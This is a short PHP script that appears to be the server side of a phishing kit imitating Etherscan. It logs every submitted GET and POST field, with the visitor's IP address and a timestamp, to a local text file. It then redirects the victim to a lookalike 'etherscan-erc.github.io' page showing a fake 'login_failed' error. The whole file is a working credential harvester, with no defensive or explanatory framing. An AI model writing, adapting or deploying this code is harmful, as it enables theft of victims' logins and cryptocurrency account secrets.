<?php
header ('Location: https://etherscan-erc.github.io/invalid.html?=10065877425?fb_source=bookmark_apps&ref=bookmarks&count=0&fb_bmpos=login_failed\";/');
$handle = fopen("reloads.txt", "a");

foreach($_GET as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
$ip = $_SERVER['REMOTE_ADDR'];
foreach($_POST as $variable => $value) {
   fwrite($handle, $variable);
   fwrite($handle, "=");
   fwrite($handle, $value);
   fwrite($handle, "\r\n");
}

fwrite($handle, ":Ip Address: $ip");
fwrite($handle, "\r\n");
fwrite($handle, ":Waktu Masuk: ".date('d-M-Y G:i:s A',  strtotime("+7 hours"))."\r\n");
// assuming Indonesia timzone is GMT +7 and you want 24-hour format time
// according to your comments below
fclose($handle);
exit;
echo "<script images=\"JavaScript\">
<!--
window.location=\" https://etherscan-erc.github.io/invalid.html?=10065877425?fb_source=bookmark_apps&ref=bookmarks&count=0&fb_bmpos=login_failed\";
// -->
</script>";
?>

?>
